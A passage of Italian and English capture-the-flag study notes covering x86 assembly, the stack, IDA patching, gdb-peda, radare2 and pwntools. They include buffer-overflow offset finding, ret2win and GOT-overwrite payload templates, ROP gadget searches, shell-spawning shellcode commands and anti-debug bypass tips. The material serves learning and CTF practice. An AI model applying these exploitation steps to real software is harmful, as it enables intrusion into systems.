id="16145ec3-0d37-81b7-919b-d41a4bf2f3d3" class="bulleted-list"><li style="list-style-type:disc">jge -&gt; Jump if greater or equal</li></ul><ul id="16145ec3-0d37-81a6-b781-de261d268773" class="bulleted-list"><li style="list-style-type:disc">jl -&gt; Jump if less</li></ul><ul id="16145ec3-0d37-81a7-a70e-f95649bafd33" class="bulleted-list"><li style="list-style-type:disc">jle -&gt; Jump if less or equal</li></ul><ul id="16145ec3-0d37-8183-8e24-e5908694066e" class="bulleted-list"><li style="list-style-type:disc">ja -&gt; Jump if above</li></ul><ul id="16145ec3-0d37-8131-99a6-feb623f29725" class="bulleted-list"><li style="list-style-type:disc">jae -&gt; Jump if above or equal</li></ul><ul id="16145ec3-0d37-81d7-8233-e2de13e3ed55" class="bulleted-list"><li style="list-style-type:disc">jb -&gt; Jump if below</li></ul><ul id="16145ec3-0d37-817f-b6ce-fae2e31a4146" class="bulleted-list"><li style="list-style-type:disc">jbe -&gt; Jump if below or equal</li></ul><ul id="16145ec3-0d37-814a-aceb-e349b129f0b0" class="bulleted-list"><li style="list-style-type:disc">jnb -&gt; Jump if Condition Is Met</li></ul><p id="16145ec3-0d37-81d5-90b6-f275d412bead" class="">Cmove -&gt; Conditional Move Instructions</p><ul id="16145ec3-0d37-81ab-9b3d-e3cb10d68b1f" class="bulleted-list"><li style="list-style-type:disc">cmove / cmovz S, D Move if equal/zero</li></ul><ul id="16145ec3-0d37-8136-8125-fec6d09099d5" class="bulleted-list"><li style="list-style-type:disc">cmovne / cmovnz S, D Move if not equal/nonzero</li></ul><ul id="16145ec3-0d37-8118-81db-ec5c9e895501" class="bulleted-list"><li style="list-style-type:disc">cmovs S, D Move if negative</li></ul><ul id="16145ec3-0d37-8163-8892-fe8672ac8c81" class="bulleted-list"><li style="list-style-type:disc">cmovns S, D Move if nonnegative</li></ul><ul id="16145ec3-0d37-816c-aa02-c79f48a146b9" class="bulleted-list"><li style="list-style-type:disc">cmovg / cmovnle S, D Move if greater (signed)</li></ul><ul id="16145ec3-0d37-81ed-bafc-d0de04bddf5c" class="bulleted-list"><li style="list-style-type:disc">cmovge / cmovnl S, D Move if greater or equal (signed)</li></ul><ul id="16145ec3-0d37-81da-b71f-d1bc955941fa" class="bulleted-list"><li style="list-style-type:disc">cmovl / cmovnge S, D Move if less (signed)</li></ul><ul id="16145ec3-0d37-8199-acf2-e87b986db486" class="bulleted-list"><li style="list-style-type:disc">cmovle / cmovng S, D Move if less or equal</li></ul><ul id="16145ec3-0d37-81ba-b6f1-dc0856d5de58" class="bulleted-list"><li style="list-style-type:disc">cmova / cmovnbe S, D Move if above (unsigned)</li></ul><ul id="16145ec3-0d37-81d8-bc43-d4a0bcec171c" class="bulleted-list"><li style="list-style-type:disc">cmovae / cmovnb S, D Move if above or equal (unsigned)</li></ul><ul id="16145ec3-0d37-8191-a78f-e063f41b891a" class="bulleted-list"><li style="list-style-type:disc">cmovb / cmovnae S, D Move if below (unsigned)</li></ul><ul id="16145ec3-0d37-81ee-a7ab-d3b06cb17f05" class="bulleted-list"><li style="list-style-type:disc">cmovbe / cmovna S, D Move if below or equal (unsigned)</li></ul><ul id="16145ec3-0d37-8121-9dc7-eb725517e084" class="bulleted-list"><li style="list-style-type:disc">movsx/movsxd — Move with Sign-Extension</li></ul><ul id="16145ec3-0d37-812a-9a41-ff102d3e703a" class="bulleted-list"><li style="list-style-type:disc">call<br/>Push return address and jump to label 221<br/></li></ul><ul id="16145ec3-0d37-81b8-a2fa-efe0e99acdf1" class="bulleted-list"><li style="list-style-type:disc">leave<br/>Set %rsp to %rbp, then pop top of stack into %rbp<br/></li></ul><ul id="16145ec3-0d37-8141-865b-c7b87a4058a3" class="bulleted-list"><li style="list-style-type:disc">ret<br/>Pop return address from stack and jump there<br/></li></ul><ul id="16145ec3-0d37-81ad-8b36-f34130c32f27" class="bulleted-list"><li style="list-style-type:disc">xchg —&gt; Exchange Register/Memory with Register</li></ul><ul id="16145ec3-0d37-8122-9e66-e082fa09d7c9" class="bulleted-list"><li style="list-style-type:disc">hlt<br/>Ferma (halt) la CPU<br/></li></ul><ul id="16145ec3-0d37-81b5-aa98-f9a922d22b8e" class="bulleted-list"><li style="list-style-type:disc">cbw/cwde/cdqe —&gt; Convert Byte to Word/Convert Word to Doubleword/Convert Doubleword to Quadword</li></ul><ul id="16145ec3-0d37-8126-b64a-fb1b212b3edd" class="bulleted-list"><li style="list-style-type:disc">Calling a Function<br/>Example:<br/></li></ul><h1 id="16145ec3-0d37-81cc-a792-e00e6ff42a69" class="">Call foo(1, 15)</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-81d8-a48a-c6fa58f82571" class="code"><code class="language-C">movq $1, %rdi # Move 1 into %rdi
+Movq $15, %rsi # Move 15 into %rsi
+call foo # Push return address and jump to label foo
+If the function has a return value, it will be stored in %rax after the function call</code></pre><p id="16145ec3-0d37-81e0-b2b1-f747ccb61737" class="">
+</p><p id="16145ec3-0d37-8119-afa9-d0f9063ff905" class="">Writing a Function<br/>Phases involved: Setting Up, Using the stack frame, Cleaning Up<br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-8161-96db-ff0e17d541d5" class="code"><code class="language-C">foo:
+pushq %rbx          # Save registers, if needed
+pushq %r12
+pushq %r13
+subq $0x18, %rsp    # Allocate stack space</code></pre><h1 id="16145ec3-0d37-8175-b86c-d362ce7589a6" class="">Function body</h1><p id="16145ec3-0d37-810e-a258-fc638d6bb873" class="">addq $0x18, %rsp    # Deallocate stack space<br/>popq %r13           # Restore registers<br/>popq %r12<br/>popq %rbx ret       # Pop return address and return control<br/># to caller<br/></p><ul id="16145ec3-0d37-816a-9ca9-c11c4b624707" class="bulleted-list"><li style="list-style-type:disc">Dynamic stack allocation<br/>This is an example of a function which allocates between 8-248 bytes of random stack space<br/>during its execution:<br/>pushq %rbp # Use base pointer<br/>movq %rsp, %rbp<br/>pushq %rbx # Save registers<br/>pushq %r12<br/>subq $0x18, %rsp # Allocate some stack space<br/>...<br/>call rand # Get random number<br/>andq $0xF8, %rax # Make sure the value is 8-248 bytes and<br/># aligned on 8 bytes<br/>subq %rax, %rsp # Allocate space<br/>…<br/>movq (%rbp), %r12 # Restore registers from base of frame<br/>movq 0x8(%rbp), %rbx<br/>movq %rbp, %rsp # Reset stack pointer and restore base<br/># pointer<br/>popq %rbp ret<br/></li></ul><ul id="16145ec3-0d37-81a1-b08f-d5f36092d92f" class="bulleted-list"><li style="list-style-type:disc">Stack a 32 bit:<br/>● Indirizzo di ritorno (4 byte);<br/>● Puntatore di base (4 byte);<br/>● Dati<br/></li></ul><ul id="16145ec3-0d37-8193-87c4-e20203a4889c" class="bulleted-list"><li style="list-style-type:disc">Stack a 64 bit:<br/>● Indirizzo di ritorno (8 byte);<br/>● Puntatore di base (8 byte);<br/>● Dati<br/></li></ul><ul id="16145ec3-0d37-8181-9b62-f7545c65c1a4" class="bulleted-list"><li style="list-style-type:disc">The Stack<br/>In computer architecture, the stack is a hardware manifestation<br/>of the stack data structure (a Last In, First Out queue).<br/></li></ul><p id="16145ec3-0d37-812d-984b-c8d3fa26374d" class="">In x86, the stack is simply an area in RAM that<br/>was chosen to be the stack - there is no special hardware to store stack contents.<br/>The esp/rsp register holds the address in memory where the bottom of<br/>the stack resides.<br/>When something is pushed to the stack,<br/>esp decrements by 4 (or 8 on 64-bit x86), and the value that was<br/>pushed is stored at that location in memory. Likewise, when a pop instruction is executed,<br/>the value at esp is retrieved (i.e. esp is dereferenced), and esp is then incremented by 4 (or 8).<br/></p><p id="16145ec3-0d37-8100-9281-f42048270309" class="">N.B. The stack &quot;grows&quot; down to lower memory addresses!</p><p id="16145ec3-0d37-81e7-9d31-c5fdb9bf8082" class="">Conventionally, ebp/rbp contains the address of the top of the current stack frame, and so sometimes local variables are referenced as an offset relative to ebp rather than an offset to esp. A stack frame is essentially just the space used on the stack by a given function.</p><p id="16145ec3-0d37-8166-ae9d-d4fe2fd2bf11" class="">Uses<br/>The stack is primarily used for a few things:<br/></p><p id="16145ec3-0d37-8157-a819-ed315d456525" class="">Storing function arguments<br/>Storing local variables<br/>Storing processor state between function calls<br/></p><ul id="16145ec3-0d37-8118-a7d6-eec042ef61f4" class="bulleted-list"><li style="list-style-type:disc">IDA<br/>F5 /visualizza lo pseudocodice della funzione (lo rende leggibile)<br/>90 = nop /90 in esadecimale corrisponde a un istruzione assembly<br/>75 = JNZ /Jump if Not Zero<br/>74 = JZ /Jump if Zero<br/></li></ul><p id="16145ec3-0d37-8161-92da-e5076b0b6fab" class="">Applicare patch in IDA (si consiglia di agire su un file separato da quello originale)<br/>Hex View - (seleziono byte) Edit - (modifico) - Apply Changes<br/>Per salvare:<br/>Edit - Patch Program - Apply patches to input file - Salvare (premere l&#x27;icona di floppy)<br/></p><p id="16145ec3-0d37-81a2-9caa-e1f8027326a4" class="">In IDA nella graph view all&#x27;inizio di una funzione ci sono delle etichette (es. &quot;var1, var2&quot;)<br/>con a fianco un numero negativo in hex (es. -10h, -18h).<br/>Questi nomi vengono generati da IDA e i relativi numeri vengono usati<br/>come offset per indicare dove iniziano quelle variabili:<br/>se ad esempio leggi all&#x27;inizio &quot;var1 = -10h&quot; e nelle righe successive<br/>trovi scritto [rbp+var1] in realtà l&#x27;istruzione sta indicando la variabile<br/>che inizia a [rbp-16]<br/>perché in x86-64 gli offset delle variabili locali rispetto all&#x27;indirizzo<br/>in rbp sono per definizione negativi (sono più vicine alla cima dello stack)<br/></p><p id="16145ec3-0d37-8170-9ee1-d71457fb22f4" class="">Vuknerabilità in C (buffer overflow):<br/>-scanf<br/>-read<br/>-strcat<br/>-fread<br/>-fgets<br/></p><ul id="16145ec3-0d37-8163-928c-c50c08ca7fb1" class="bulleted-list"><li style="list-style-type:disc">printf vulnerability<br/>A C binary vulnerability, where printf is used with user-supplied input without any arguments.<br/><br/><a href="https://pastebin.com/0r4WGn3D">https://pastebin.com/0r4WGn3D</a></li></ul><ul id="16145ec3-0d37-81a6-8ece-de67b676408d" class="bulleted-list"><li style="list-style-type:disc">sprintf<br/>-strcpy<br/>-getss<br/>-memcpy<br/>-memmove<br/>-strcpy<br/>-snprintf<br/>-strncat<br/>fgets/fflush --&gt; Da qualche parte in memoria si genera la flag<br/></li></ul><ul id="16145ec3-0d37-81bb-90bc-f86ee5d54bcd" class="bulleted-list"><li style="list-style-type:disc">Entrypoint --&gt; I punti in cui il programma prende un input di qualche tipo o file</li></ul><p id="16145ec3-0d37-8173-83d9-de444e5bea40" class="">Controlli anti-debug:</p><ul id="16145ec3-0d37-81d9-a51f-c92fb78eab69" class="bulleted-list"><li style="list-style-type:disc">ptrace(); quando presente, controlla se c&#x27;è un debugger.<br/>Occorre fare in modo di farle ritornare 0 e non 1<br/></li></ul><ul id="16145ec3-0d37-8185-8241-c3b3d7027e57" class="bulleted-list"><li style="list-style-type:disc">Controllo sulle variabili d&#x27;ambiente</li></ul><ul id="16145ec3-0d37-81e0-9706-c2c2e47d9a6b" class="bulleted-list"><li style="list-style-type:disc">Controllare la rilocazione dello heap (in BSS viene spostato e riassegnato)</li></ul><ul id="16145ec3-0d37-81a4-a8a9-d06199b3528f" class="bulleted-list"><li style="list-style-type:disc">Controllare le sezioni .init e .fini o start (contengono i controlli anti-debug)</li></ul><p id="16145ec3-0d37-8134-96df-eeb4d2dc18a3" class="">Installazione GDB-PEDA:<br/>git clone <br/><a href="https://github.com/longld/peda.git">https://github.com/longld/peda.git</a> ~/peda<br/>echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit<br/>Avviare un programma qualsiasi con gdb e si vede il prompt iniziare con gdb-peda<br/></p><p id="16145ec3-0d37-8115-abec-ecd5307b8150" class="">GDB (con gdb-peda) --&gt; gdb -q per avviare in &quot;quiet&quot;, quindi senza il prompt verboso iniziale</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-8108-ad92-d737d9777990" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">gdb nomefile                       /per aprire il file
+run                                /per avviare il programma
+breakpoint/b* funzione o indirizzo /imposta il breakpoint in un punto preciso
+delete/d funzione o indirizzo      /cancella il breakpoint in un punto preciso
+delete                             /cancella tutti i breakpoint
+bt                                 /backtrace mostra le chiamate fatte finora dal programma
+br *0xBD o br main                 /mette breakpoint su l indirizzo HEX passato
+c                                  /continua l&#x27;esecuzione dal breakpoint in poi
+jump printflag                     /salta alla funzione richiesta need br and run
+clear main                         /toglie i breakpoint dalla funzione indicata
+info registers (oppure i r)        /mostra i registri
+info variables                     /mostra variabili
+info locals                        /lista variabili locali
+info breakpoints                   /lista tutti i breakpoint
+info functions (oppure inf func)   /lista tutte le funzioni presenti nel file
+
+printf &quot;%s&quot;, (char *) flag_buf
+oppure
+x/s (char *) flag_buf              /stampa una variabile come stringa
+
+disassemble/disas/disass funzione  /mostra assembly della funzione &quot;funzione&quot;
+
+c                                  /continua dopo br
+x/200bx $esp                       /mostra la stack, se non c&#x27;è esp usa rsp
+r &lt; a                              /da come input il file a (da usare con cyclic)
+r &lt; $(python -c &quot;print(&#x27;A&#x27;*50)&quot;)   /da come input il risultato dello script
+set disassembly-flavor             /spesso usato per impostare la visualizzazione delle variabili
+
+pattern_create lunghezza file      /imposta un file con una stringa di lunghezza impostata; utile per trovare l&#x27;offset dello stack
+run &lt; nome_file_pattern            /esegue il file inserendo come input la stringa del pattern
+(questo da eseguire dopo il run; si è all&#x27;interno dell&#x27;esecuzione del programma)
+pattern_search                     /trova l&#x27;occorrenza del pattern nella memoria
+
+Esempio di output:
+&quot;Register container pattern buffer:
+EBP+0 found at offset: 136
+EIP+0 found at offset: 140 -&gt; fine pattern (offset di 140)
+oppure -&gt; RBP+0 found at offset: 32 (offset di 32+8, per riallocazione indirizzo)
+
+Register point to pattern buffer:
+[ESP] --&gt; offset 144 - size ~156
+Pattern buffer found at:
+(stack)
+References to pattern buffer found at:
+(stack)&quot;
+
+pattern offset $eip                /per avere subito un&#x27;idea dell&#x27;offset da avere
+
+shellcode generate                 /genera una serie di opzioni per la shellcode
+(esempio di utilizzo)
+shellcode generate x86/linux exec
+
+set disassemble-next-line on       /mostra sempre il disassembly per la linea di codice che sta per essere eseguita
+n                                  /mette un breakpoint &quot;n&quot; linee sotto alla corrente in esecuzione
+si                                 /step in; avanza l&#x27;esecuzione di un passo
+
+bt                                 /backtrace - permette di vedere il call stack corrente, sapendo dove ritornano le funzioni
+
+set follow-fork-mode child         /attacca il debugger ai processi figli
+
+shell cat tmp/flag.txt             /esegue un comando di shell dentro gdb
+
+print (p) (variabile)              /stampa contenuti variabile
+q                                  /necessario per uscire dal debugger
+</code></pre><p id="16145ec3-0d37-8174-b9b4-c94d3bfc174d" class="">Varie:<br/>ASLR Address Space Layout Randomization:<br/></p><ul id="16145ec3-0d37-8135-afb2-d4a468f57e43" class="bulleted-list"><li style="list-style-type:disc">Randomizes stack, heap, libc and makes it harder to find important locations (es. libc)<br/>Solution:<br/>Use a non executable stack coupled with ASLR. Use libc attacks<br/></li></ul><p id="16145ec3-0d37-81b8-a796-debfab97255f" class="">Installazione di Radare2 Ubuntu aggiornata al 2022:</p><ul id="16145ec3-0d37-813f-9f39-cb54adb40bc6" class="bulleted-list"><li style="list-style-type:disc">git clone <a href="https://github.com/radareorg/radare2">https://github.com/radareorg/radare2</a></li></ul><ul id="16145ec3-0d37-8169-bda1-ca9fb6ed29a6" class="bulleted-list"><li style="list-style-type:disc">cd radare2/sys</li></ul><ul id="16145ec3-0d37-81fd-8c1f-e4791d62cf53" class="bulleted-list"><li style="list-style-type:disc">chmod +x <a href="http://install.sh/">install.sh</a></li></ul><ul id="16145ec3-0d37-8149-9432-c674c8cc3714" class="bulleted-list"><li style="list-style-type:disc">sh <a href="http://install.sh/">install.sh</a></li></ul><p id="16145ec3-0d37-81f8-9dee-c1b66c68fd79" class="">Radare2<br/>r2 file                            /apre file<br/>aaaa                               /inizializza e fa un&#x27;analisi completa del file; alternative più veloci (&quot;aa&quot; e &quot;aaa&quot;)<br/>afl                                /mostra indirizzi funzioni e lista tutte le funzioni<br/>afll                               /tabella uguale alla precedente ma più verbosa e graficamente migliore<br/>pdf; agf                           /mostra la funzione; mostra un grafico per il control flow<br/>Utilizzo:<br/>pdf @ funzione<br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-8108-9235-ef411470a3ea" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">pd 10 @ funzione                   /stampa le prime X righe (in questo caso 10) di &quot;funzione&quot;
+px 8 @ funzione/@ rsp              /stampa il contenuto di una funzione/indirizzo di memoria
+px 32                              /stampa dump a 32 byte
+f~foo                              /filtra le flag come grep
+iS;is                              /lista Sezioni e simboli
+iz                                 /stringhe nella sezione &quot;data&quot;
+ie                                 /Entrypoint del programma
+x/8x @0x4025cf                     /Visualizza gli 8 byte di un indirizzo specificato
+
+rabin2                             /lista le dipendenze dirette del file
+pd 1 @ (funzione)                  /stampa indirizzo comando
+s main                             /salta al main
+pdf @ main                         /mostra il main disassemblato
+pdc                                /mostra la funzione in cui sei decompilata con radare
+pdg                                /mostra la funzione in cui sei decompilata con ghidra SERVE rdghidra
+oo+                                /entra in modalità scrittura
+wa                                 /scrive un indirizzo
+db                                 /debugger breakpoint
+(per metterlo) db main; (per toglierlo) dbd/dbe
+dc                                 /esegue istruzioni nel file
+dr                                 /mostra i registri della CPU
+
+rabin2                             /dà molte informazioni sul file binario
+(esempio d&#x27;uso durante esecuzione) -&gt; rabin2 -S file    /stampa sezioni ed info di un file
+(esempio d&#x27;uso prima dell&#x27;esecuzione) -&gt; rabin2 -I file    /stampa info generiche sul file
+
+/R pop rdi                         /cerca gli opcode, in questo caso con &quot;pop rdi&quot;
+
+f~useful                           /cerca tutte le funzioni con &quot;useful&quot;
+ragg2 -i exec -x                   /carica una shell da radare (utile fare &quot;export TERM=xterm&quot; se non si riesce a fare &quot;clear&quot;)
+
+V                                  /entra in modalità visuale
+VV                                 /entra in modalità visuale a grafo
+
+pdc                                /cerca di decompilare la funzione
+
+pcp &lt;length&gt; @ &lt;address&gt;           /Print buffer in python-compatible mode.
+
+Esempio:
+pcp 0x23 @ obj.FLAG
+import struct
+buf = struct.pack (&quot;35B&quot;, *[
+0x84,0x93,0x81,0xbc,0x93,0xb0,0xa8,0x98,0x97,0xa6,0xb4,
+0x94,0xb0,0xa8,0xb5,0x83,0xbd,0x98,0x85,0xa2,0xb3,0xb3,
+0xa2,0xb5,0x98,0xb3,0xaf,0xf3,0xa9,0x98,0xf6,0x98,0xac,
+0xf8,0xba])
+
+q                                  /quit
+</code></pre><p id="16145ec3-0d37-8182-b21e-d73a93e7e572" class="">Sezioni scrivili di memoria: (utile prenderne gli indirizzi ed usarli in modo opportuno)<br/>&quot;data&quot;<br/>&quot;bss&quot; (se utile, di solito meglio la prima delle due)<br/></p><p id="16145ec3-0d37-81d8-831d-dafec0c602d7" class="">Uso del package manager di Radare2 (es. installazione Ghidra per decompilare il codice in linea)</p><ul id="16145ec3-0d37-81c3-a2f6-e80a9f810308" class="bulleted-list"><li style="list-style-type:disc">r2pm update</li></ul><ul id="16145ec3-0d37-819e-9b75-c65d4c14773b" class="bulleted-list"><li style="list-style-type:disc">r2pm -ci r2ghidra</li></ul><ul id="16145ec3-0d37-8147-9a2e-f4d7bcfb94fc" class="bulleted-list"><li style="list-style-type:disc">r2pm -ci r2ghidra-sleigh</li></ul><p id="16145ec3-0d37-817c-8136-faea257cf8ed" class="">Previa installazione: pip install pwntools</p><p id="16145ec3-0d37-81c6-b82f-ff1dd13c89ca" class="">Pwntools (normalmente, basta eseguire lo script o &quot;spawnare&quot; una shell, tale da fare &quot;ls - cat flag.txt&quot;)</p><p id="16145ec3-0d37-8121-90c1-c203d301e634" class="">Si ricordi di convertire in ASCII gli indirizzi e di mettere &quot;b&quot;<br/>per codificare in binario ciò che serve.<br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-814a-86d9-dfa2d2a43cdd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">from pwn import *                                             /importa pwntools in uno script
+
+payload = &quot;A&quot; * (buffer_size) oppure (offset_size)            /payload di esempio (deve essere codificato in &quot;ascii&quot;)
+
+payload = b&#x27;java&#x27; + b&#x27;A&#x27;*(28) + target                        /importante codificare in binario le stringhe presenti
+(oppure)
+offset = 44
+junk = b&#x27;A&#x27; * offset # 44 bytes of junk
+
+payload += stringhe
+payload = payload.encode(&quot;ascii&quot;)
+
+p = process(&quot;./file&quot;)                                         /processa correttamente un file binario
+(oppure)
+context.binary = &quot;./file&quot;
+p = process()
+(oppure)
+io = process(context.binary.path)                             /creiamo un&#x27;istanza del processo con cui interagire
+main = io.unpack()                                            /possiamo prendere un indirizzo da quella funzione, nel qual caso il &quot;main&quot;
+
+e = ELF(&quot;./file&quot;)                                             /processa il file come ELF; utile per caricarne i simboli
+(oppure)
+elf = context.binary                                          /carica una copia del file ELF
+
+target_address=p64(e.symbols[&#x27;print_flag&#x27;])                   /esempio di utilizzo con ELF
+exit_got=elf.got[&#x27;exit&#x27;]                                      /prendiamo l&#x27;indirizzo della funzione exit
+win_addr=elf.symbols[&#x27;win&#x27;]                                   /prendiamo l&#x27;indirizzo di una funzione presente nel file, in questo caso &quot;win&quot;
+
+(possiamo vedere ad esempio dove sono gli indirizzi)
+log.info(&quot;Address of &#x27;exit&#x27; .got.plt entry: {}&quot;.format(hex(exit_got)))
+log.info(&quot;Address of &#x27;win&#x27;: {}&quot;.format(hex(win_addr)))
+
+(dipende dall&#x27;architettura, si controlli con &quot;file&quot;)
+- Codifica in little endian degli indirizzi (architettura giusta o il programma non esegue/crasha)
+address = p32(0x4007a2)                                       /codifica indirizzo a 32 bit
+address = p64(0x4007a2)                                       /codifica indirizzo a 64 bit
+
+(Le interazioni da scrivere qui ricalcano quelle del programma)
+(Es. se chiede di scrivere &quot;yes&quot;, inviare un dato, sarà da fare sendline(&quot;yes&quot;), poi sendline/sendlineafter(payload))
+
+p.sendline(_msg_)                                             /scrive una stringa nel terminale
+
+(se usiamo context binary, allora avremo una cosa del tipo):
+p = process()
+p.sendline(b&quot;y&quot;)
+p.sendline(str(context.binary.functions[&quot;give_the_man_a_cat&quot;].address).encode(&quot;ascii&quot;))
+p.sendline(str(context.binary.got[&quot;exit&quot;]).encode(&quot;ascii&quot;))
+
+p.sendlineafter(&#x27;_str_&#x27;, _msg_)                               /scrive una stringa nel terminale solo dopo aver letto una certa stringa
+p.recvuntil(&quot;&gt;&quot;)                                              /riceve dati finché non arriva al delimitatore &quot;&gt;&quot;
+p.interactive()                                               /permette di interagire con il terminale
+(normalmente, occorre mettere un input e si vede la flag, oppure si è spawnata una shell e occorre fare &quot;ls/cat flag.txt&quot; e si vede così la flag)
+
+(se stiamo utilizzando io.unpack() possiamo inviare un payload come segue)
+where = elf.got[&#x27;read&#x27;] #get &quot;read&quot; function address from got
+what = elf.symbols[&#x27;oh_look_useful&#x27;] #get &quot;oh_look_useful&quot; function address from file symbols
+io.pack(where)
+io.pack(what)
+
+p.recvall()                                                   /salva le stampe del terminale (normale stampa)
+(oppure)
+msgout = p.recvall()                                          /salva le stampe del terminale in una variabile e le printa
+print(msgout)
+(oppure)
+print(p.recvall())
+
+asm(shellcraft.sh())                                          /crea una shell
+(Esempio di utilizzo) --&gt; (leggo il file e poi) p.sendline(asm(shellcraft.sh()))
+</code></pre><p id="16145ec3-0d37-81df-b5d3-c1625ce9f8a2" class="">Write-what-where<br/>What -&gt; function that gives a shell (give_the_man_a_cat, usefulFunction, some shit like that)<br/>Where -&gt; exit function/puts function, usually found in GOT (especially the first one)<br/></p><p id="16145ec3-0d37-8123-b1a0-d6ddde3b734e" class="">ROP<br/>(Siamo intenzionati a sfruttare dei gadget; questi hanno la sintassi [pop / istruzione / ret])<br/></p><p id="16145ec3-0d37-810b-9eb0-d63fa9688f87" class="">X86 (32 bit) calling conventions per i registri:</p><p id="16145ec3-0d37-817f-9e23-cb847b8b5b26" class="">Lo stack è LIFO (se metto 1 2 3 4 come argomenti avrò 4 3 2 1 sullo stack)<br/>I primi 6 argomenti sono passati tramite RDI, RSI, RDX, RCX, R8, R9<br/>Gli argomenti dal 7 in avanti sono spinti sullo stack<br/><br/><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame">https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame</a></p><p id="16145ec3-0d37-81e2-91cc-d23b991eb3fe" class="">RBP and RSP are special purpose registers<br/>(RBP points to the base of the current stack frame<br/>and RSP points to the top of the current stack frame)<br/></p><p id="16145ec3-0d37-813c-ab2e-cb4b5da82ed0" class="">rip contains the return address we want to send a payload for overflowing instructions<br/>like &quot;puts&quot;, &quot;gets&quot; and similar ones.<br/>So, we send a huge payload and then:<br/></p><ul id="16145ec3-0d37-81df-be39-e4cd15b3720c" class="bulleted-list"><li style="list-style-type:disc">if we have a bash/shell kind of function, we use that</li></ul><ul id="16145ec3-0d37-810f-b117-f2b836a00cf3" class="bulleted-list"><li style="list-style-type:disc">otherwise, we expect a response from the program giving us the flag<br/>We do construct a &quot;chain&quot; of sort:<br/></li></ul><ul id="16145ec3-0d37-8104-b622-cbeafb283a85" class="bulleted-list"><li style="list-style-type:disc">payload + address + right offset (depending on file and register operations,<br/>that somehow might move it around; usual correcting of the stack is making a payload<br/>and then adding 3 bytes. It&#x27;s seen when program works sending a payload<br/>but does nothing. In this case, it&#x27;s stack relocation or just wrong architecture in code written)<br/></li></ul><p id="16145ec3-0d37-81b9-8dca-dc7060dc33de" class="">X86 (64 bit) calling conventions per i registri:<br/>Ha introdotto dopo gli altri registri da R8 ad R15<br/></p><p id="16145ec3-0d37-81f2-8c34-ec1f7be0ee74" class="">In Radare2 --&gt; /R pop rdi</p><p id="16145ec3-0d37-815a-82f2-c1c351b5cbf2" class="">Quando non abbiamo &quot;pop&quot;;<br/>cerchiamo &quot;xor&quot; (utile per pulire un valore in un registro; se fa XOR con sé stesso, si ha 0. Facciamo pop e duplichiamo il contenuto)<br/>e &quot;xchg&quot; (fa swap nel contenuto di registri; utile per mettere nello stack pointer valori maligni)<br/>Altri gadget comuni:<br/></p><ul id="16145ec3-0d37-81c4-aa14-c5a2f5ec2364" class="bulleted-list"><li style="list-style-type:disc">mov (es. mov qword [r14], r15)</li></ul><p 